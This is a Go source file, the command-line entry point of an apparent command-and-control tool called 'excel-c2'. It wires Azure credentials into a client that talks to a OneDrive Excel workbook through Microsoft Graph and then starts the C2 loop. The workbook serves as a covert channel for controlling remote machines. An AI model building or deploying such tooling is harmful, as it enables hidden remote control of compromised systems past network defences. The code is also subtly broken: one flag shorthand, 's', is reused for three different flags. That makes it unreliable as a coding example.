package cmd

import (
	"net/http"
	"os"

	"Excel-C2/internal/C2"

	"github.com/spf13/cobra"
)

var (
	// TO HARDCODE, set the values here, eg...
	// tenantId string = "blahblahblah....I'm_a_tenant_id...."
	tenantId      string
	clientId      string
	clientSecret  string
	fileName      string
	userId        string
	debug_default bool = false
)

var rootCmd = &cobra.Command{
	Use:   "excel-c2",
	Short: "excel-c2",
	Long:  `excel-c2`,

	Run: func(cmd *cobra.Command, args []string) {
		c2 := new(C2.Client)

		//Azure fields
		c2.TenantId = tenantId
		c2.ClientId = clientId
		c2.ClientSecret = clientSecret
		c2.FileName = fileName
		c2.UserId = userId

		//HTTP Fields
		c2.UserAgent = "GoLang Client"
		c2.HttpClient = new(http.Client)
		c2.BaseURL = "https://graph.microsoft.com/v1.0/users/" + c2.UserId + "/drive/root:/" + c2.FileName
		c2.Debug = debug_default

		// Find the drive/sheet IDs
		C2.UpdateSheetMeta(c2)

		// Update the BaseURL with drive/sheet IDs
		c2.BaseURL = "https://graph.microsoft.com/v1.0/drives/" + c2.DriveId + "/items/" + c2.SheetId + "/workbook/worksheets"

		//Start
		C2.Run(c2)
	},
}

func init() {
	if tenantId == "" {
		if os.Getenv("TENANT_ID") != "" {
			tenantId = os.Getenv("TENANT_ID")
		} else {
			rootCmd.Flags().StringVarP(&tenantId, "tenant", "t", os.Getenv("TENANT_ID"), "Azure tenant ID")
			rootCmd.MarkFlagRequired("tenant")
		}
	}

	if clientId == "" {
		if os.Getenv("CLIENT_ID") != "" {
			clientId = os.Getenv("CLIENT_ID")
		} else {
			rootCmd.Flags().StringVarP(&clientId, "client", "c", os.Getenv("CLIENT_ID"), "Azure client ID")
			rootCmd.MarkFlagRequired("client")
		}
	}

	if clientSecret == "" {
		if os.Getenv("CLIENT_SECRET") != "" {
			clientSecret = os.Getenv("CLIENT_SECRET")
		} else {
			rootCmd.Flags().StringVarP(&clientSecret, "secret", "s", os.Getenv("CLIENT_SECRET"), "Azure client secret")
			rootCmd.MarkFlagRequired("secret")
		}
	}

	if fileName == "" {
		if os.Getenv("FILE_NAME") != "" {
			fileName = os.Getenv("FILE_NAME")
		} else {
			rootCmd.Flags().StringVarP(&fileName, "file", "s", os.Getenv("FILE_NAME"), "Excel file name")
			rootCmd.MarkFlagRequired("file")
		}
	}

	if userId == "" {
		if os.Getenv("USER_ID") != "" {
			userId = os.Getenv("USER_ID")
		} else {
			rootCmd.Flags().StringVarP(&userId, "user", "s", os.Getenv("USER_ID"), "Azure user ID")
			rootCmd.MarkFlagRequired("user")
		}
	}

	rootCmd.Flags().BoolVarP(&debug_default, "verbos", "v", debug_default, "Enable verbos output")
}

func Execute() {
	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}
